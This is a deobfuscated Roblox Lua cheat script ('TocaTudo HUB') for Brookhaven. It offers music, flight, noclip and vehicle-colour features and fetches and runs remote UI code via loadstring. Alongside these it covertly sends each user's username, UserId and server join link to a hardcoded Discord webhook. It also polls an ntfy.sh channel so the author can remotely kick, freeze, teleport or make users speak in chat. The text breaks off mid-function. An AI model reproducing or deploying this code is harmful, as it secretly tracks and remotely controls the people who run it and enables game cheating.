-- Lynd Deobfuscator & Dumper | https://discord.gg/SRvRc2XF6s
-- TocaDuca Lularphed
-- Deobf by lynd

local userInputService = game:GetService("UserInputService")
local contextActionService = game:GetService("ContextActionService")
local runService = game:GetService("RunService")
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")
local teleportService = game:GetService("TeleportService")
local textChatService = game:GetService("TextChatService")
local fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local saveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local interfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
pcall(function()
    contextActionService:UnbindAction("Backspace")
    contextActionService:UnbindAction("ChatBackspace")
    contextActionService:UnbindAction("Chat")
end
)
contextActionService:BindActionAtPriority("_FluentBackspaceFix", function(p1, p2)
    if p2 == Enum.UserInputState.Begin then
        local getFocusedTextBox = userInputService:GetFocusedTextBox()
        if getFocusedTextBox then
            local cursorPosition = getFocusedTextBox.CursorPosition
            if cursorPosition > 1 then
                local text = getFocusedTextBox.Text
                getFocusedTextBox.Text = text:sub(1, cursorPosition - 2)..text:sub(cursorPosition)
                getFocusedTextBox.CursorPosition = cursorPosition - 1
            end
            return Enum.ContextActionResult.Sink
        end
        return Enum.ContextActionResult.Pass
    end
    return Enum.ContextActionResult.Pass
end
,  false, Enum.ContextActionPriority.High.Value, Enum.KeyCode.Backspace)
local localPlayer = players.LocalPlayer
local v1 = localPlayer.Name == "isaquemax2030"
local window = fluent:CreateWindow({
    Title = "TocaTudo HUB",
    SubTitle = "By: isaquemax2030",
    TabWidth = 160,
    Size = UDim2.fromOffset(580,
    460),
    Acrylic =  true,
    Theme = "Rose",
    MinimizeKey = Enum.KeyCode.LeftControl,
}
)
local v2 = "Se sabe que eu to gostando"
local v3 = ""
local v4 =  false
local v5 =  false
local v6 = "tocatudo_bug_"..localPlayer.UserId.. ".json"
local v7 = "tocatudo_sugestao_"..localPlayer.UserId.. ".json"
local v8 = "tocatudo_server_"..localPlayer.UserId.. ".json"
local v9 = {
    ["Se sabe que eu to gostando"] = "137188221417776",
    ["157"] = "122488203955460",
    ["Se liga aí novinha"] = "122871552019283",
    ["Ela é do tipo que eu gosto"] = "120075559226752",
    ["Sentada nervosa"] = "100461622411736",
    Brotas = "130012040756565",
    Princessa = "109330943148950",
    ["Baile do antares (Estourado)"] = "102853170480978",
    ["Seilar o nome dessa musica"] = "128941560210313",
    ["eai e você com você"] = "75474964672565",
    ["Cabelin pique de chefe (Estourada)"] = "100162235063839",
    ["to de onet"] = "73476657388728",
    Pedido = "112416262448027",
    ["Só uma su"] = "122259510323980",
    ["Se eu fosse embora (Vibe boa)"] = "140472521093719",
    ["quero ver vc sentar"] = "94384686700395",
    ["se revela"] = "108262691010286",
    flexiona = "79542404424793",
    ["os cria tá de radinho"] = "122271413003280",
    ["Pra fica legal"] = "90279100823725",
    ["vai sentar por gerente"] = "122369808511994",
    ["me ensina por favor faz pra te esquecer"] = "102593134121793",
    ["Toda hora"] = "124768087285254",
    ["Musica russa"] = "112822173806661",
    ["Tropa do rato"] = "74885231607109",
    ["muita abundancia"] = "111078444478729",
    ["Trap da princessa"] = "85810100527045",
}
local values = {
    "Se sabe que eu to gostando",
    "157",
    "Se liga aí novinha",
    "Ela é do tipo que eu gosto",
    "Sentada nervosa",
    "Brotas",
    "Princessa",
    "Baile do antares (Estourado)",
    "Seilar o nome dessa musica",
    "eai e você com você",
    "Cabelin pique de chefe (Estourada)",
    "to de onet",
    "Pedido",
    "Só uma su",
    "Se eu fosse embora (Vibe boa)",
    "quero ver vc sentar",
    "se revela",
    "flexiona",
    "os cria tá de radinho",
    "Pra fica legal",
    "vai sentar por gerente",
    "me ensina por favor faz pra te esquecer",
    "Toda hora",
    "Musica russa",
    "Tropa do rato",
    "muita abundancia",
    "Trap da princessa",
}
local playerToolEvent = replicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent")
local function f1(p3)
    local v10
    pcall(function()
        if p3.Value ~=  nil then
            v10 = tostring(p3.Value)
        end
    end
)
    if v10 and v10 ~= "" then
        return v10
    end
    pcall(function()
        local getValue = p3:GetValue()
        if getValue ~=  nil then
            v10 = tostring(getValue)
        end
    end
)
    if v10 and v10 ~= "" then
        return v10
    end
    return v10
end
local function f2()
    local v11, v12 = pcall(function()
        if isfile and isfile(v8) then
            return httpService:JSONDecode(readfile(v8))
        end
        return nil
    end
)
    local lastJobId = v12 and v12.lastJobId or ""
    local lastSent = v12 and v12.lastSent or 0
    local jobId = game.JobId
    local v13 = lastJobId == jobId
    local v14
    if v13 and os.time() - lastSent < 1800 then
        return
    else
        local v15 = tostring(game.PlaceId)
        local v16 = tostring(game.JobId)
        local value = tostring(localPlayer.UserId)
        local v17 = tostring(game.PlaceId)
        local v18 = tostring(game.JobId)
        local toIsoDate = DateTime.now():ToIsoDate()
        v14 = {
            content = "**Novo servidor detectado!**",
            embeds = {
                {
                    title = "Script Executado por "..localPlayer.DisplayName,
                    color = 5763719,
                    thumbnail = {
                        url = "https://www.roblox.com/headshot-thumbnail/image?userId="..localPlayer.UserId.. "&width=420&height=420&format=png",
                    },
                    fields = {
                        {
                            name = "Nome de Usuário",
                            value = localPlayer.Name,
                            inline =  true
                        },
                        {
                            name = "Display Name",
                            value = localPlayer.DisplayName,
                            inline =  true
                        },
                        {
                            name = "UserId",
                            value = value,
                            inline =  true
                        },
                        {
                            name = "Jogo",
                            value = "Brookhaven ("..v17.. ")",
                            inline =  true
                        },
                        {
                            name = "JobId",
                            value = "```"..v18.. "```",
                            inline =  false
                        },
                        {
                            name = "Link Direto",
                            value = "[Clique aqui para entrar]("..("https://www.roblox.com/games/start?placeId="..v15.. "&gameInstanceId="..v16).. ")",
                            inline =  false,
                        },
                    },
                    footer = {
                        text = "TocaTudo HUB - Sistema de Rastreio"
                    },
                    timestamp = toIsoDate,
                },
            },
        }
        pcall(function()
            request({
                Url = "https://discord.com/api/webhooks/1548451230034952282/xe0kfENI-aeV72OuaSnHm6JCVmxz9-YRsrguee1deK9GjCvCZRNTlojUwek9GAg2xLs9",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = httpService:JSONEncode(v14),
            }
)
        end
)
        pcall(function()
            if writefile then
                writefile(v8, httpService:JSONEncode({
                    lastJobId = jobId,
                    lastSent = os.time()
                }
))
            end
        end
)
        return
    end
end
task.spawn(function()
    task.wait(3)
    f2()
end
)
local aplicarNome = "[ Ursuario (a) do TocaTudo HUB ]"
local aplicarBio = "☠️ O rei dos ID ☠️"
local function f3(p4)
    local v19 = p4 or aplicarBio
    pcall(function()
        local waitForChild = replicatedStorage:WaitForChild("RE", 5)
        if waitForChild then
            local findFirstChild = waitForChild:FindFirstChild("1RPNam1eTex1t")
            if findFirstChild then
                findFirstChild:FireServer(table.unpack({
                    [1] = "RolePlayBio",
                    [2] = v19
                }
))
            end
        end
    end
)
end
local function f4(p5)
end
local function f5(p6)
end
local function f6(p7)
end
local v20 =  true
local v21 =  nil
local function f7()
    if v21 then
        return
    end
    v20 =  true
    v21 = task.spawn(function()
        local v22 = 0
        while v20 do
            v22 = v22 + 0.03
            if v22 >= 1 then
                v22 = v22 - 1
            end
            f6(Color3.fromHSV(v22, 1, 1))
            task.wait(0.1)
        end
        v21 =  nil
    end
)
end
local v23 =  true
local function f8()
    v20 =  false
    if v21 then
        task.cancel(v21)
        v21 =  nil
    end
end
local v24 =  nil
local function f9()
    v23 =  false
    if v24 then
        task.cancel(v24)
        v24 =  nil
    end
end
local f10
local function f11()
    f7()
    f10()
end
function f10()
    if v24 then
        return
    end
    v23 =  true
    v24 = task.spawn(function()
        local v25 = 0
        while v23 do
            v25 = v25 + 0.03
            if v25 >= 1 then
                v25 = v25 - 1
            end
            f5(Color3.fromHSV(v25, 1, 1))
            task.wait(0.1)
        end
        v24 =  nil
    end
)
end
local function f12()
    f8()
    f9()
end
local function f13()
    task.wait(3)
    task.wait(0.5)
    task.wait(0.5)
    f11()
end
if localPlayer.Character then
    task.spawn(f13)
end
local function f14(walkSpeed)
    pcall(function()
        if localPlayer.Character then
            local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = walkSpeed
            end
        end
    end
)
end
local characterAdded = localPlayer.CharacterAdded
local function f15()
    v5 =  false
end
characterAdded:Connect(function()
    task.wait(2)
    f13()
end
)
task.spawn(function()
    task.wait(5)
    task.wait(0.5)
    task.wait(0.5)
    if not v21 or not v24 then
        f11()
    end
end
)
local function f16()
    playerToolEvent:FireServer(unpack({
        [1] = "ToolMusicStop",
        [2] = "",
        [4] =  true
    }
))
end
local v26 =  false
local function f17()
    if v26 then
        return
    end
    v26 =  true
    task.spawn(function()
        while v26 and localPlayer.Character do
            local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                humanoidRootPart.Anchored =  true
            end
            task.wait(0.1)
        end
    end
)
end
local function f18()
    v26 =  false
    if localPlayer.Character then
        local humanoidRootPart2 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart2 then
            humanoidRootPart2.Anchored =  false
        end
    end
end
local function f19(p8, p9, p10)
    if not p9 then
        return
    else
        local v27 = p9 == localPlayer.Name
        local v28 = v27
        local displayName = localPlayer.DisplayName
        if not v27 then
            v28 = p9 == displayName or p9:lower() == "all"
        end
        if not v28 then
            return
        end
        if p8 == "ping" then
            fluent:Notify({
                Title = "Conexão OK",
                Content = "Sistema de comandos funcionando!",
                Duration = 5,
            }
)
        elseif p8 == "bring" then
            local isaquemax2030 = players:FindFirstChild("isaquemax2030")
            if isaquemax2030 and isaquemax2030.Character and localPlayer.Character then
                local humanoidRootPart3 = isaquemax2030.Character:FindFirstChild("HumanoidRootPart")
                local humanoidRootPart4 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart3 and humanoidRootPart4 then
                    humanoidRootPart4.CFrame = humanoidRootPart3.CFrame * CFrame.new(0, 0, 3)
                end
            end
        elseif p8 == "kick" then
            fluent:Notify({
                Title = "Você foi kickado",
                Content = "Motivo: "..(p10 ~= "" and p10 or "Sem motivo"),
                Duration = 8,
            }
)
            task.wait(2)
            localPlayer:Kick("Você foi kickado por ".. "isaquemax2030".. "\nMotivo: "..(p10 ~= "" and p10 or "Sem motivo"))
        elseif p8 == "say" then
            if p10 ~= "" then
                pcall(function()
                    if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                        textChatService.TextChannels.RBXGeneral:SendAsync(p10)
                    end
                end
)
            end
        elseif p8 == "freeze" then
            f17()
        elseif p8 == "unfreeze" then
            f18()
        end
        return
    end
end
local function f20(cmd, target, args)
    local jsonEncode = httpService:JSONEncode({
        cmd = cmd,
        target = target,
        args = args,
        timestamp = os.time(),
        id = tostring(math.random(100000000,
        999999999)),
    }
)
    return pcall(function()
        request({
            Url = "https://ntfy.sh/tocatudo_isaquemax_2024_k7x9",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "text/plain"
            },
            Body = jsonEncode,
        }
)
    end
) or pcall(function()
        game:HttpPost("https://ntfy.sh/tocatudo_isaquemax_2024_k7x9", jsonEncode)
    end
)
end
local v29 = {
}
local function f21(p11)
    local v30, v31 = pcall(function()
        return game:HttpGet(p11)
    end
)
    if v30 and v31 and # tostring(v31) > 50 then
        return tostring(v31)
    else
        local v32, v33 = pcall(function()
            return request({
                Url = p11,
                Method = "GET",
                Headers = {
                    Accept = "application/x-ndjson"
                }
            }
)
        end
)
        if v32 and v33 and # tostring(v33) > 50 then
            return tostring(v33)
        end
        return nil
    end
end
task.spawn(function()
    task.wait(2)
    while true do
        task.wait(2)
        local httpsNtfyShTocatudoIsaquemax2024K7x9JsonPoll1 = f21("https://ntfy.sh/tocatudo_isaquemax_2024_k7x9/json?poll=1")
        if httpsNtfyShTocatudoIsaquemax2024K7x9JsonPoll1 and httpsNtfyShTocatudoIsaquemax2024K7x9JsonPoll1 ~= "" then
            for match in httpsNtfyShTocatudoIsaquemax2024K7x9JsonPoll1:gmatch("[^\r\n]+") do
                local v34 = match
                local v35, v36 = pcall(function()
                    return httpService:JSONDecode(v34)
                end
)
                if v35 and v36 and v36.event == "message" and v36.message then
                    local v37, v38 = pcall(function()
                        return httpService:JSONDecode(v36.message)
                    end
)
                    if v37 and v38 and v38.id and v38.timestamp then
                        if not v29[v38.id] then
                            v29[v38.id] =  true
                            if os.time() - v38.timestamp < 60 then
                                if v38.target and(v38.target == localPlayer.Name or v38.target:lower() == "all") then
                                    f19(v38.cmd, v38.target, v38.args or "")
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end
)
local function f22(p12)
    return string.format("%d:%02d", math.floor(p12 / 60), p12 % 60)
end
local function f23(p13)
    pcall(function()
        if writefile then
            writefile(p13, httpService:JSONEncode({
                lastSubmit = os.time()
            }
))
        end
    end
)
end
local f24
local function f25(p14)
    local v39 = f24(p14)
    local v40 = 600 -(os.time() - v39)
    if v40 < 0 then
        v40 = 0
    end
    return v40
end
function f24(p15)
    local v41, v42 = pcall(function()
        if isfile and isfile(p15) then
            return httpService:JSONDecode(readfile(p15))
        end
        return nil
    end
)
    if v41 and v42 and v42.lastSubmit then
        return v42.lastSubmit
    end
    return 0
end
local function f26(jumpPower)
    pcall(function()
        if localPlayer.Character then
            local humanoid2 = localPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid2 then
                humanoid2.JumpPower = jumpPower
            end
        end
    end
)
end
local function f27(p16)
end
local v43
local function f28()
    if v43 then
        return
    end
    v43 = task.spawn(function()
        local v44 = 0
        while v5 do
            v44 = v44 + 0.03
            if v44 >= 1 then
                v44 = v44 - 1
            end
            f27(Color3.fromHSV(v44, 1, 1))
            task.wait(0.02)
        end
        v43 =  nil
    end
)
end
local f29
local function f30(p17)
    if not p17 or tostring(p17) == "" then
        fluent:Notify({
            Title = "Erro",
            Content = "ID vazio ou inválido!",
            Duration = 3
        }
)
        return false
    end
    playerToolEvent:FireServer(unpack({
        [1] = "ToolMusicStop",
        [2] = "",
        [4] =  true
    }
))
    task.wait(0.05)
    playerToolEvent:FireServer(unpack({
        [1] = "ToolMusicText",
        [2] = tostring(p17),
        [4] =  true
    }
))
    task.spawn(function()
        task.wait(0.1)
        f29()
    end
)
    return true
end
function f29()
    for index, value2 in ipairs({
        localPlayer.Character,
        localPlayer:FindFirstChild("Backpack"),
        localPlayer:FindFirstChild("StarterGear"),
    }
) do
        if value2 then
            local boombox = value2:FindFirstChild("Boombox")
            if boombox then
                local handle = boombox:FindFirstChild("Handle")
                if handle then
                    local playersChoice = handle:FindFirstChild("PlayersChoice")
                    if playersChoice and playersChoice:IsA("Sound") then
                        playersChoice.Volume = 1
                    end
                end
            end
        end
    end
end
local v45 =  false
local connect =  nil
local function f31()
    if connect then
        return
    end
    connect = runService.Stepped:Connect(function()
        if v45 and localPlayer.Character then
            for index2, value3 in ipairs(localPlayer.Character:GetDescendants()) do
                if value3:IsA("BasePart") and value3.CanCollide then
                    value3.CanCollide =  false
                end
            end
        end
    end
)
end
local function f32()
    local v46 = v9[v2]
    if v46 then
        f30(v46)
    end
end
local v47 =  false
local connect2 =  nil
local v49 = 50
local v50 =  nil
local v51 =  nil
local function f33()
    if connect2 then
        return
    else
        local character = localPlayer.Character
        if not character then
            return
        else
            local humanoidRootPart5 = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart5 then
                return
            else
                local bodyVelocity = Instance.new("BodyVelocity")
                bodyVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                bodyVelocity.Velocity = Vector3.zero
                bodyVelocity.Parent = humanoidRootPart5
                v50 = bodyVelocity
                local bodyGyro = Instance.new("BodyGyro")
                bodyGyro.MaxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
                bodyGyro.P = 1000
                bodyGyro.D = 50
                bodyGyro.Parent = humanoidRootPart5
                v51 = bodyGyro
                connect2 = runService.RenderStepped:Connect(function()
                    if not v47 then
                        return
                    else
                        local currentCamera = workspace.CurrentCamera
                        if not currentCamera then
                            return
                        else
                            local character2 = localPlayer.Character
                            if not character2 then
                                return
                            elseif not character2:FindFirstChild("HumanoidRootPart") then
                                return
                            else
                                local zero = Vector3.zero
                                if userInputService:IsKeyDown(Enum.KeyCode.W) then
                                    zero = zero + currentCamera.CFrame.LookVector
                                end
                                if userInputService:IsKeyDown(Enum.KeyCode.S) then
                                    zero = zero - currentCamera.CFrame.LookVector
                                end
                                if userInputService:IsKeyDown(Enum.KeyCode.A) then
                                    zero = zero - currentCamera.CFrame.RightVector
                                end
                                if userInputService:IsKeyDown(Enum.KeyCode.D) then
                                    zero = zero + currentCamera.CFrame.RightVector
                                end
                                if userInputService:IsKeyDown(Enum.KeyCode.Space) then
                                    zero = zero + Vector3.new(0, 1, 0)
                                end
                                if userInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                                    zero = zero - Vector3.new(0, 1, 0)
                                end
                                if zero.Magnitude > 0 then
                                    zero = zero.Unit * v49
                                end
                                if v50 then
                                    v50.Velocity = zero
                                end
                                return
                            end
                        end
                    end
                end
)
                return
            end
        end
    end
end
local function f34()
    v45 =  false
    if connect then
        connect:Disconnect()
        connect =  nil
    end
end
local function f35()
    v47 =  false
    if connect2 then
        connect2:Disconnect()
        connect2 =  nil
    end
    if v50 then
        v50:Destroy()
        v50 =  nil
    end
    if v51 then
        v51:Destroy()
        v51 =  nil
    end
end
local walkSpeed2 = 16
local jumpPower2 = 50
localPlayer.CharacterAdded:Connect(function(character3)
    task.wait(1)
    local humanoid3 = character3:FindFirstChildOfClass("Humanoid")
    if humanoid3 then
        humanoid3.WalkSpeed = walkSpeed2
        humanoid3.JumpPower = jumpPower2
    end
end
)
local v53 = {
    MusicVehicles = window:AddTab({
        Title = "Música e Veículos",
        Icon = "music"
    }
),
    PlayerTab = window:AddTab({
        Title = "Player",
        Icon = "user"
    }
),
    Support = window:AddTab({
        Title = "Suporte",
        Icon = "message-circle"
    }
),
    Credits = window:AddTab({
        Title = "Créditos",
        Icon = "heart"
    }
),
    Settings = window:AddTab({
        Title = "Config.",
        Icon = "settings"
    }
),
}
if v1 then
    v53.Owner = window:AddTab({
        Title = "Owner",
        Icon = "crown"
    }
)
end
local mSica = v53.MusicVehicles:AddSection("Música")
mSica:AddParagraph({
    Title = "TocaTudo",
    Content = "Escolha a música e toque na sua Boombox"
}
)
mSica:AddDropdown("FunkDropdownV33", {
    Title = "Escolha o Funk",
    Values = values,
    Default = "Se sabe que eu to gostando",
}
):OnChanged(function(p18)
    v2 = p18
    if v4 then
        f32()
    end
end
)
mSica:AddToggle("MusicToggleV22", {
    Title = "Tocar Música",
    Default =  false
}
):OnChanged(function(p19)
    v4 = p19
    if p19 then
        f32()
        fluent:Notify({
            Title = "TocaTudo HUB",
            Content = "Tocando: "..v2,
            Duration = 3
        }
)
    else
        f16()
        fluent:Notify({
            Title = "TocaTudo HUB",
            Content = "Música pausada.",
            Duration = 3
        }
)
    end
end
)
local addInput = mSica:AddInput("CustomIDInputV33", {
    Title = "ID Personalizado",
    Default = "",
    Placeholder = "Ex: 1837879089",
    Numeric =  false,
}
)
addInput:OnChanged(function(p20)
    v3 = tostring(p20 or "")
end
)
mSica:AddButton({
    Title = "Tocar ID Personalizado",
    Callback = function()
        local v54 = f1(addInput)
        if not v54 or v54 == "" then
            v52 = v3
        end
        if not v54 or v54 == "" then
            fluent:Notify({
                Title = "Erro",
                Content = "Insira um ID válido primeiro!",
                Duration = 3
            }
)
            return
        else
            local gsub = tostring(v54):gsub("%s",
            ""):gsub("`",
            ""):gsub("[^%d]",
            "")
            if gsub == "" then
                fluent:Notify({
                    Title = "Erro",
                    Content = "ID inválido! Use apenas números.",
                    Duration = 3,
                }
)
                return
            end
            if f30(gsub) then
                fluent:Notify({
                    Title = "Tocando ID Personalizado",
                    Content = "ID: "..gsub,
                    Duration = 4,
                }
)
            end
            return
        end
    end
,
}
)
mSica:AddToggle("RainbowToggleV33", {
    Title = "Caixa RGB / Rainbow",
    Default =  false
}
):OnChanged(function(p21)
    v5 = p21
    if p21 then
        f28()
    else
        f15()
    end
end
)
local skate = v53.MusicVehicles:AddSection("Skate")
skate:AddParagraph({
    Title = "Veículo",
    Content = "Equipe o skate e personalize"
}
)
local v55 =  false
task.spawn(function()
    if v55 then
        return
    end
    pcall(function()
        local remotes = replicatedStorage:FindFirstChild("Remotes")
        if not remotes then
            return
        end
        local setNoMotorVehicleSpeed = remotes:FindFirstChild("SetNoMotorVehicleSpeed")
        if not setNoMotorVehicleSpeed then
            return
        end
        local v56
        if hookmetamethod then
            v56 =  nil
            v56 = hookmetamethod(game, "__namecall", function(p22,...)
                if p22 == setNoMotorVehicleSpeed then
                    local v57 = getnamecallmethod()
                    if v57 == "InvokeServer" or v57 == "FireServer" then
                        return nil
                    end
                    return v56(p22,...)
                end
                return v56(p22,...)
            end
)
            v55 =  true
        end
    end
)
end
)
skate:AddToggle("SkateEquipToggleV22", {
    Title = "Equipar Skate",
    Default =  false
}
):OnChanged(function(p23)
    if p23 then
        task.wait(2)
        fluent:Notify({
            Title = "Skate",
            Content = "Skate equipado.",
            Duration = 3
        }
)
    else
        pcall(function()
            local rE = replicatedStorage:FindFirstChild("RE")
            if rE then
                local findFirstChild2 = rE:FindFirstChild("1Ca1r")
                if findFirstChild2 then
                    findFirstChild2:FireServer("NoMotorVehicleDeleteCar")
                end
            end
        end
)
    end
end
)
local v59 =  false
local v60
local function f36()
    v59 =  false
    if v60 then
        task.cancel(v60)
        v60 =  nil
    end
end
local v61 = 80
local f37
local function f38()
    if v60 then
        return
    end
    v60 = task.spawn(function()
        local v62 = 0
        while v59 do
            pcall(function()
                v62 = v62 + 0.04
                if v62 >= 1 then
                    v62 = v62 - 1
                end
                f37(Color3.fromHSV(v62, 1, 1))
            end
)
            local v63 = 0.08
            if type(v61) == "number" then
                v63 = v61 / 1000
            end
            task.wait(v63)
        end
        v60 =  nil
    end
)
end
function f37(p24)
    pcall(function()
        local setColor = localPlayer.PlayerGui.MainGUIHandler.NoMotorVehicleControl.NoMotorColorPicks.SetColor
        if setColor then
            setColor:FireServer(p24)
        end
    end
)
    pcall(function()
        local re2 = replicatedStorage:FindFirstChild("RE")
        if re2 then
            local findFirstChild3 = re2:FindFirstChild("1Player1sCa1r")
            if findFirstChild3 then
                findFirstChild3:FireServer(table.unpack({
                    [1] = "NoMotorColor",
                    [2] = p24
                }
))
            end
        end
    end
)
end
skate:AddToggle("SkateRGBToggleV29", {
    Title = "Skate RGB",
    Default =  false
}
):OnChanged(function(p25)
    v59 = p25
    if p25 then
        f38()
        fluent:Notify({
            Title = "Skate RGB",
            Content = "RGB ativado!",
            Duration = 3
        }
)
    else
        f36()
    end
end
)
skate:AddSlider("SkateSpeedSliderV29", {
    Title = "Velocidade do RGB do Skate",
    Default = 80,
    Min = 60,
    Max = 300,
    Rounding = 0,
    Callback = function(value4)
        v58 = value4
    end
,
}
)
skate:AddParagraph({
    Title = "Música no Skate",
    Content = "Toque som direto no seu skate"
}
)
local v64 = "Se sabe que eu to gostando"
local function f39(p26)
    if not p26 or tostring(p26) == "" then
        fluent:Notify({
            Title = "Erro",
            Content = "ID vazio ou inválido!",
            Duration = 3
        }
)
        return false
    end
    task.wait(0.05)
    pcall(function()
        local re3 = replicatedStorage:FindFirstChild("RE")
        if re3 then
            local findFirstChild4 = re3:FindFirstChild("1NoMoto1rVehicle1s")
            if findFirstChild4 then
                findFirstChild4:FireServer(table.unpack({
                    [1] = "PickingScooterMusicText",
                    [2] = tostring(p26),
                    [3] =  true,
                }
))
            end
        end
    end
)
    return true
end
skate:AddDropdown("SkateMusicDropdownV23", {
    Title = "Música do Skate",
    Values = values,
    Default = "Se sabe que eu to gostando",
}
):OnChanged(function(p27)
    v64 = p27
end
)
local addToggle = skate:AddToggle("SkateMusicToggleV22", {
    Title = "Tocar Música no Skate",
    Default =  false,
}
)
addToggle:OnChanged(function(p28)
    if p28 then
        local v66 = "137188221417776"
        if not v66 then
            fluent:Notify({
                Title = "Erro",
                Content = "Música não encontrada!",
                Duration = 3
            }
)
            addToggle:SetValue( false)
            return
        end
        f39(v66)
        fluent:Notify({
            Title = "TocaTudo no Skate",
            Content = "Tocando: "..v64,
            Duration = 3
        }
)
        return
    end
end
)
local hoverboard = v53.MusicVehicles:AddSection("Hoverboard")
hoverboard:AddParagraph({
    Title = "Veículo",
    Content = "Equipe o hoverboard e personalize"
}
)
local function f40()
    pcall(function()
        local remotes2 = replicatedStorage:FindFirstChild("Remotes")
        if remotes2 then
            local telemetryClientInteraction = remotes2:FindFirstChild("TelemetryClientInteraction")
            if telemetryClientInteraction then
                telemetryClientInteraction:FireServer(table.unpack({
                    [1] = "filterClick",
                    [2] = {
                        itemType = "Vehicles",
                        name = "SegwaySmall"
                    },
                }
))
            end
        end
    end
)
    task.wait(0.3)
    for index3, value5 in ipairs({
        "SegwaySmall",
        "Hoverboard",
        "SpawnSegway",
        "Segway",
        "SpawnSegwaySmall",
    }
) do
        local v67 = value5
        pcall(function()
            local re4 = replicatedStorage:FindFirstChild("RE")
            if re4 then
                local findFirstChild5 = re4:FindFirstChild("1NoMoto1rVehicle1s")
                if findFirstChild5 then
                    findFirstChild5:FireServer(v67)
                end
            end
        end
)
        task.wait(0.15)
    end
    task.wait(1.5)
end
hoverboard:AddToggle("HoverboardEquipToggleV8", {
    Title = "Equipar Hoverboard",
    Default =  false,
}
):OnChanged(function(p29)
    if p29 then
        f40()
        task.wait(2)
        fluent:Notify({
            Title = "Hoverboard",
            Content = "Hoverboard spawnado.",
            Duration = 4
        }
)
    end
end
)
local v68 =  false
local v69 = 80
local v70, f41
local function f42()
    if v70 then
        return
    end
    v70 = task.spawn(function()
        local v72 = 0
        while v68 do
            pcall(function()
                v72 = v72 + 0.04
                if v72 >= 1 then
                    v72 = v72 - 1
                end
                f41(Color3.fromHSV(v72, 1, 1))
            end
)
            local v74 = 0.08
            if type(v69) == "number" then
                v74 = v69 / 1000
            end
            task.wait(v74)
        end
        v70 =  nil
    end
)
end
function f41(p30)
    pcall(function()
        local setColor2 = localPlayer.PlayerGui.MainGUIHandler.NoMotorVehicleControl.NoMotorColorPicks.SetColor
        if setColor2 then
            setColor2:FireServer(p30)
        end
    end
)
    pcall(function()
        local re5 = replicatedStorage:FindFirstChild("RE")
        if re5 then
            local findFirstChild6 = re5:FindFirstChild("1Player1sCa1r")
            if findFirstChild6 then
                findFirstChild6:FireServer(table.unpack({
                    [1] = "NoMotorColor",
                    [2] = p30
                }
))
            end
        end
    end
)
end
local function f43()
    v68 =  false
    if v70 then
        task.cancel(v70)
        v70 =  nil
    end
end
hoverboard:AddToggle("HoverboardRGBToggleV8", {
    Title = "Hoverboard RGB",
    Default =  false
}
):OnChanged(function(p31)
    v68 = p31
    if p31 then
        f42()
    else
        f43()
    end
end
)
hoverboard:AddSlider("HoverboardSpeedSliderV8", {
    Title = "Velocidade do RGB do Hoverboard",
    Default = 80,
    Min = 60,
    Max = 300,
    Rounding = 0,
    Callback = function(value6)
        v65 = value6
    end
,
}
)
hoverboard:AddParagraph({
    Title = "Música no Hoverboard",
    Content = "Toque som direto no seu hoverboard",
}
)
local function f44(p32)
    if not p32 or tostring(p32) == "" then
        return false
    end
    task.wait(0.05)
    pcall(function()
        local re6 = replicatedStorage:FindFirstChild("RE")
        if re6 then
            local findFirstChild7 = re6:FindFirstChild("1NoMoto1rVehicle1s")
            if findFirstChild7 then
                findFirstChild7:FireServer(table.unpack({
                    [1] = "PickingScooterMusicText",
                    [2] = tostring(p32),
                    [3] =  true,
                }
))
            end
        end
    end
)
    return true
end
hoverboard:AddDropdown("HoverboardMusicDropdownV8", {
    Title = "Música do Hoverboard",
    Values = values,
    Default = "Se sabe que eu to gostando",
}
):OnChanged(function(p33)
end
)
local addToggle2 = hoverboard:AddToggle("HoverboardMusicToggleV8", {
    Title = "Tocar Música no Hoverboard",
    Default =  false,
}
)
addToggle2:OnChanged(function(p34)
    if p34 then
        local v75 = "137188221417776"
        if not v75 then
            addToggle2:SetValue( false)
            return
        end
        f44(v75)
        return
    end
end
)
local nomeEBio = v53.PlayerTab:AddSection("Nome e Bio")
local addInput2 = nomeEBio:AddInput("NameInputV11", {
    Title = "Nome",
    Default = aplicarNome,
    Placeholder = "Digite o nome...",
    Numeric =  false,
}
)
local v76 = aplicarNome
addInput2:OnChanged(function(p35)
    v76 = tostring(p35 or "")
end
)
nomeEBio:AddButton({
    Title = "Aplicar Nome",
    Callback = function()
        local v77 = f1(addInput2)
        if not v77 or v77 == "" then
            v71 = v76
        end
        if not v77 or v77 == "" then
            fluent:Notify({
                Title = "Erro",
                Content = "Digite um nome antes de aplicar!",
                Duration = 3,
            }
)
            return
        end
        aplicarNome = v77
        f4(v77)
        fluent:Notify({
            Title = "Nome Aplicado",
            Content = "Nome: "..v77,
            Duration = 4
        }
)
    end
,
}
)
local addInput3 = nomeEBio:AddInput("BioInputV11", {
    Title = "Bio",
    Default = aplicarBio,
    Placeholder = "Digite a bio...",
    Numeric =  false,
}
)
local v78 = aplicarBio
addInput3:OnChanged(function(p36)
    v78 = tostring(p36 or "")
end
)
nomeEBio:AddButton({
    Title = "Aplicar Bio",
    Callback = function()
        local v79 = f1(addInput3)
        if not v79 or v79 == "" then
            v73 = v78
        end
        if not v79 or v79 == "" then
            fluent:Notify({
                Title = "Erro",
                Content = "Digite uma bio antes de aplicar!",
                Duration = 3,
            }
)
            return
        end
        aplicarBio = v79
